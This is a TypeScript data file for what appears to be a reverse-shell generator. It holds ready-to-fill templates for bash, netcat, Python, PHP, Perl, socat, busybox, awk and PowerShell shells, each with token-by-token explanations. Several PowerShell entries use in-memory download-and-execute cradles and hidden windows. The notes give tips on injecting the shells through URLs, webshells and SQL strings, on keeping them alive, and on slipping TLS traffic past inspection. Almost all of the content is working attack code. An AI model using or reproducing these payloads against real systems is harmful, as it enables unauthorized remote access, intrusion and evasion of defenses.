import { POWERSHELL_TCP, POWERSHELL_TLS } from "./psScripts";
import type { ListenerId, PayloadDef } from "./types";

const REVERSE: ListenerId[] = ["penelope", "rlwrap-nc"];
const SH_PART = { token: "/bin/sh -i", explain: "-i: interactive shell. /bin/sh is used because it exists everywhere; the pipe, not the shell, does the work." };
const FIFO_PARTS = [
  { token: "rm -f /tmp/f", explain: "-f: no error if the pipe does not exist yet; clears a stale one from a previous try." },
  { token: "mkfifo /tmp/f", explain: "Builds the named pipe that carries your keystrokes back into the shell." },
  { token: "cat /tmp/f", explain: "Feeds whatever arrives on the pipe into the shell's stdin." },
  SH_PART,
  { token: "2>&1", explain: "Sends errors down the same pipe so you see them." },
  { token: "nc", explain: "Opens the connection to your listener. No -e: OpenBSD nc, the default on most distros, does not have it." },
  { token: "> /tmp/f", explain: "Writes your replies into the pipe, closing the loop." },
];
const FIFO = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f";
const BASH_C_PART = { token: "bash -c", explain: "-c: run the quoted string. Added outside a real bash prompt (injection, URL, system()) so dash does not choke on the payload." };
const SERVE = "python3 -m http.server {SERVE_PORT}";
const SERVE_PART = {
  token: "python3 -m http.server",
  explain: "On Kali, from the folder with the file: serves it on port 80, or on 8000 when your listener takes 80 (the cradle URL then says :8000). Leave it running until the shell connects.",
};
const ALL_LINUX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"] as const;

export const REVERSE_SHELLS: PayloadDef[] = [
  {
    id: "bash-tcp", generator: "shell", title: "Bash /dev/tcp", os: "linux",
    contexts: ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"],
    requires: ["bash"],
    template: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    parts: [
      { token: "bash -i", explain: "-i: interactive bash. /dev/tcp is a bash feature, so sh or dash cannot run this unwrapped." },
      { token: ">&", explain: "Sends stdout and stderr to the socket." },
      { token: "/dev/tcp/", explain: "Bash's built-in pseudo-device: opens a TCP connection to host/port." },
      { token: "0>&1", explain: "Feeds the socket back in as stdin, so you can type." },
      { token: "bash -c", explain: "-c: added outside a real bash prompt (injection, URL, system()) so dash does not choke on >& and /dev/tcp." },
    ],
    listeners: REVERSE,
  },
  {
    id: "mkfifo-nc", generator: "shell", title: "mkfifo + nc", os: "linux",
    contexts: [...ALL_LINUX], requires: ["nc"], template: FIFO, parts: [...FIFO_PARTS, BASH_C_PART], listeners: REVERSE,
    notes: ["Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e')."],
  },
  {
    id: "mkfifo-nc-bg", generator: "shell", title: "mkfifo + nc, backgrounded", os: "linux",
    contexts: [...ALL_LINUX], requires: ["nc"], template: `(${FIFO}) &`,
    parts: [
      { token: "( ", explain: "Subshell: groups the whole chain so it can be detached as one job." },
      ...FIFO_PARTS,
      BASH_C_PART,
      { token: ") &", explain: "Backgrounds the group so it survives a parent that reaps its children (UDF, popen, request worker)." },
    ],
    listeners: REVERSE, background: true,
    notes: ["Use when the shell connects and then dies at once: the parent process is reaping it."],
  },
  {
    id: "python3", generator: "shell", title: "Python 3 with PTY", os: "linux",
    contexts: [...ALL_LINUX], requires: ["python3"],
    template: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
    parts: [
      { token: "python3 -c", explain: "-c: run the quoted program. Use python on old hosts (which python3 python)." },
      { token: "s.connect(", explain: "Opens the TCP connection back to your listener." },
      { token: "os.dup2(", explain: "Points stdin, stdout and stderr (0,1,2) at the socket." },
      { token: "pty.spawn(", explain: "Starts bash on a PTY, so su and sudo prompts work from the first prompt." },
      BASH_C_PART,
    ],
    listeners: REVERSE,
  },
  {
    id: "php-exec", generator: "shell", title: "PHP fsockopen", os: "linux",
    contexts: [...ALL_LINUX], requires: ["php"],
    template: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    parts: [
      { token: "php -r", explain: "-r: run the quoted PHP code, no <?php tag needed." },
      { token: "fsockopen(", explain: "Opens the TCP connection to your listener." },
      { token: "/bin/sh -i", explain: "-i: interactive shell, wired to the socket below." },
      { token: "<&3 >&3 2>&3", explain: "Assumes the socket is file descriptor 3. If nothing arrives, try 4 or 5." },
      BASH_C_PART,
    ],
    listeners: REVERSE,
  },
  {
    id: "ps-b64", generator: "shell", title: "PowerShell base64 (-e)", os: "windows",
    contexts: ["cmd", "powershell", "webshell-param", "url-param", "macro"],
    requires: ["powershell"], template: POWERSHELL_TCP, encodePowerShell: true,
    parts: [
      { token: "powershell", explain: "Starts PowerShell. One token, so no quoting breaks in cmd, a URL or a SQL string." },
      { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
      { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
      { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Plain UTF-8 base64 produces garbage." },
    ],
    listeners: REVERSE,
    notes: ["A working shell makes the web request hang. If it returns at once, the payload did not hold the socket."],
  },
  {
    id: "powercat-cradle", generator: "shell", title: "powercat cradle (in memory)", os: "windows",
    contexts: ["powershell"], requires: ["powershell", "served-file"],
    template: "IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e powershell",
    parts: [
      { token: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", explain: "On Kali: copies powercat.ps1 (from Kali's powercat package) into the folder you serve." },
      SERVE_PART,
      { token: "IEX(", explain: "Runs the downloaded text as code, so nothing is written to disk." },
      { token: "DownloadString('http://", explain: "Fetches powercat.ps1 from your web server." },
      { token: "powercat -c", explain: "-c: connect out to the listener." },
      { token: "-p", explain: "-p: the listener's port." },
      { token: "-e powershell", explain: "-e: program to attach to the socket. Use cmd for a cmd shell." },
    ],
    listeners: REVERSE, prepare: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", serve: SERVE,
    notes: ["Run from a PowerShell prompt. To use it from cmd, a macro or a SQL string, base64 it for -e first."],
  },
  {
    id: "nishang-cradle", generator: "shell", title: "Nishang cradle (served rev.ps1)", os: "windows",
    contexts: ["cmd", "powershell", "sql-string"], requires: ["powershell", "served-file"],
    template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/rev.ps1')"`,
    parts: [
      { token: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1", explain: "On Kali: copies Nishang's reverse-shell script to rev.ps1 in the folder you serve." },
      {
        token: "echo 'Invoke-PowerShellTcp -Reverse -IPAddress … -Port …' >> rev.ps1",
        explain: "Appends the call, with your LHOST and LPORT, to the end of rev.ps1. Without it IEX only defines the function and nothing connects back.",
      },
      SERVE_PART,
      { token: "powershell", explain: "Starts PowerShell." },
      { token: "-nop", explain: "-nop: no profile." },
      { token: "-w hidden", explain: "-w hidden: no visible window." },
      { token: "-c", explain: "-c: run the following command text. Double-quoted so a PowerShell prompt passes it through instead of evaluating the (...) itself." },
      { token: "IEX(", explain: "Runs the downloaded rev.ps1 in memory." },
      { token: "rev.ps1", explain: "Your served reverse-shell script. It has LHOST and LPORT inside, so regenerate it after a VPN IP change." },
    ],
    listeners: REVERSE, bakesIp: true, serve: SERVE,
    prepare: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}' >> rev.ps1",
    notes: ["Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'."],
  },
  {
    id: "nc-exe", generator: "shell", title: "nc.exe -e", os: "windows",
    contexts: ["cmd", "powershell", "webshell-param", "url-param"], requires: ["nc-e"],
    template: "{FILE} -e cmd.exe {LHOST} {LPORT}", defaults: { FILE: "C:\\Windows\\Temp\\nc.exe" },
    parts: [
      { token: "nc.exe", explain: "The uploaded netcat. Defender may delete it: check it is still there if nothing arrives." },
      { token: "-e", explain: "-e: run this program and attach it to the socket." },
      { token: "cmd.exe", explain: "The program handed to the connection." },
    ],
    listeners: REVERSE,
    notes: ["Needs an nc.exe built with -e; if it returns instantly, the build has no -e."],
  },
  {
    id: "perl", generator: "shell", title: "Perl", os: "linux",
    contexts: [...ALL_LINUX], requires: ["perl"],
    template: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    parts: [
      { token: "perl -e", explain: "-e: run the quoted program. Perl is on almost every Linux, including minimal boxes without python." },
      { token: "socket(S,PF_INET,SOCK_STREAM", explain: "Creates a TCP socket named S." },
      { token: "connect(S,sockaddr_in(", explain: "Connects it to your LHOST and LPORT; the rest only runs if the connection opens." },
      { token: "open(STDIN,\">&S\")", explain: "Points stdin, stdout and stderr at the socket (the next two open() calls do stdout and stderr)." },
      SH_PART,
      BASH_C_PART,
    ],
    listeners: REVERSE,
  },
  {
    id: "socat-tty", generator: "shell", title: "socat with full TTY", os: "linux",
    contexts: [...ALL_LINUX], requires: ["socat"],
    template: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
    parts: [
      { token: "socat", explain: "Joins two ends: a shell on a PTY, and a TCP connection to you." },
      { token: "exec:'bash -li'", explain: "-li: a login, interactive bash, started for the connection." },
      { token: "pty,stderr,setsid,sigint,sane", explain: "A real terminal for it: errors included, its own session, Ctrl-C reaches the shell, sane terminal settings." },
      { token: "tcp:", explain: "Connects out to your listener." },
      BASH_C_PART,
    ],
    listeners: ["socat-tty", "rlwrap-nc"],
    notes: ["Needs socat on the target, or a static socat binary transferred and run first."],
  },
  {
    id: "busybox-nc", generator: "shell", title: "busybox nc -e", os: "linux",
    contexts: [...ALL_LINUX], requires: ["busybox"],
    template: "busybox nc {LHOST} {LPORT} -e /bin/sh",
    parts: [
      { token: "busybox nc", explain: "BusyBox's own netcat, which (unlike the stock nc on most distros) keeps -e." },
      { token: "-e", explain: "-e: run this program and attach it to the socket." },
      { token: "/bin/sh", explain: "The program handed to the connection." },
      BASH_C_PART,
    ],
    listeners: REVERSE,
    notes: ["Common on routers, embedded boxes and minimal containers. Not every BusyBox build compiles nc -e in."],
  },
  {
    id: "awk", generator: "shell", title: "awk (gawk /inet/tcp)", os: "linux",
    contexts: [...ALL_LINUX], requires: ["awk"],
    template: `awk 'BEGIN{s="/inet/tcp/0/{LHOST}/{LPORT}";while(1){printf "> " |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}}'`,
    parts: [
      { token: "awk", explain: "gawk: the only awk with built-in networking." },
      { token: "/inet/tcp/0/", explain: "gawk's special file for a TCP connection: local port 0 (any), then the remote host and port." },
      { token: "|&", explain: "Two-way pipe: writes to the socket, or reads the command you typed from it." },
      { token: "getline", explain: "Reads your command from the socket, then the output of running it." },
      BASH_C_PART,
    ],
    listeners: REVERSE,
    notes: ["Needs gawk: /inet/tcp is a gawk feature and mawk (the Debian and Ubuntu default awk) has none. Not a PTY: no su or sudo prompts."],
  },
  {
    id: "conptyshell", generator: "shell", title: "ConPtyShell (full Windows TTY)", os: "windows",
    contexts: ["powershell"], requires: ["powershell", "served-file"],
    template: "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell -RemoteIp {LHOST} -RemotePort {LPORT} -Rows {ROWS} -Cols {COLS}",
    defaults: { ROWS: "40", COLS: "160" },
    parts: [
      { token: "curl -sO https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1", explain: "On Kali: downloads the script into the folder you serve." },
      SERVE_PART,
      { token: "IEX(", explain: "Runs the downloaded text as code, so nothing is written to disk." },
      { token: "DownloadString('http://", explain: "Fetches Invoke-ConPtyShell.ps1 from your web server." },
      { token: "-RemoteIp", explain: "-RemoteIp: your listener's address." },
      { token: "-RemotePort", explain: "-RemotePort: your listener's port." },
      { token: "-Rows", explain: "-Rows: terminal height. Match it to your own terminal (stty size)." },
      { token: "-Cols", explain: "-Cols: terminal width. Match it to your own terminal (stty size)." },
    ],
    listeners: ["socat-tty"], prepare: "curl -sO https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1", serve: SERVE,
    notes: ["Run from a PowerShell prompt. Windows 10 1809 / Server 2019 or newer (needs the ConPTY API).",
      "Alternative listener: stty raw -echo; (stty size; cat) | nc -lvnp {LPORT}, so the terminal size comes across.",
      "The prepare step needs internet on Kali: keep a copy of the script for offline labs."],
  },
  {
    id: "ps-tls", generator: "shell", title: "PowerShell TLS (-e)", os: "windows",
    contexts: ["cmd", "powershell", "webshell-param", "url-param", "macro"],
    requires: ["powershell"], template: POWERSHELL_TLS, encodePowerShell: true,
    parts: [
      { token: "powershell", explain: "Starts PowerShell. One token, so no quoting breaks in cmd or a URL." },
      { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
      { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
      { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Inside it, SslStream wraps the connection in TLS and accepts any certificate." },
    ],
    listeners: ["ncat-ssl"],
    notes: ["Pairs with ncat --ssl (it makes a throwaway certificate) or openssl s_server -quiet -key key.pem -cert cert.pem -port <your LPORT>.",
      "The traffic is encrypted, so it passes inspection that would flag a plain-text shell."],
  },
];
